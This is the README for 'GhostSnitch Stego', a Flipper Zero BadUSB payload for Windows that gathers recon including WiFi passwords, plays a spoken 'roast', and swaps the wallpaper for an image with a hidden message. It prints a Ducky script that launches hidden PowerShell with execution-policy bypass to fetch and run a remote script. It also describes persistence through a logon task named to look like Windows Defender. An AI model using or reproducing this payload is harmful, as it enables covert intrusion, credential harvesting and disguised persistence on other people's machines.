# GhostSnitch Stego

**Version:** 1.1  
**Author:** I am TBJr  
**Platform:** Windows 10 / 11  
**Delivery:** Flipper Zero HID (`irm | iex`)

---

## What it does

Variant of GhostSnitch focused on wallpaper steganography. Collects recon, delivers a TTS roast, generates a wallpaper at native screen resolution, then appends a hidden ASCII message after the JPEG EOI marker.

---

## Features

- Collects: RAM, public IP, WiFi SSID + password (admin only), password age, email hint
- TTS roast via SAPI (`SpVoice`)
- Waits for mouse movement before speaking
- Generates wallpaper at **actual screen resolution** via `GetDeviceCaps` (fixed from hardcoded 800×600)
- Appends hidden message to the saved JPEG: `StegoMessage: Curiosity sparked the fire. Satisfaction burned the cat.`
- Persists via scheduled task (`WindowsDefenderStego` on logon)
- No Discord webhook — purely local

## Ducky script

```
GUI r
DELAY 600
STRING powershell -w h -NoP -NonI -Ep Bypass irm https://tbjr.github.io/Flipper-payloads/host/GhostSnitch_Stego.ps1 | iex
ENTER
```

## Known limitations

- **WiFi password** requires Administrator — gracefully reports limitation if not elevated
- **Wallpaper changes** can be blocked by Group Policy on managed machines
- The steganographic message is appended as plaintext after the JPEG end-of-image marker. Image viewers ignore the trailing bytes; reading it requires opening the file as raw bytes

## Scheduled task

The script copies itself to `$env:APPDATA\Microsoft\ghostsnitch_stego.ps1` and registers:

```
Task name : WindowsDefenderStego
Trigger   : On logon
Action    : powershell -w h -NoP -NonI -Ep Bypass -File "<path>"
```

## Credits

Inspired by AcidBurn by [I am Jakoby](https://github.com/I-Am-Jakoby). Extended by **TBJr**.
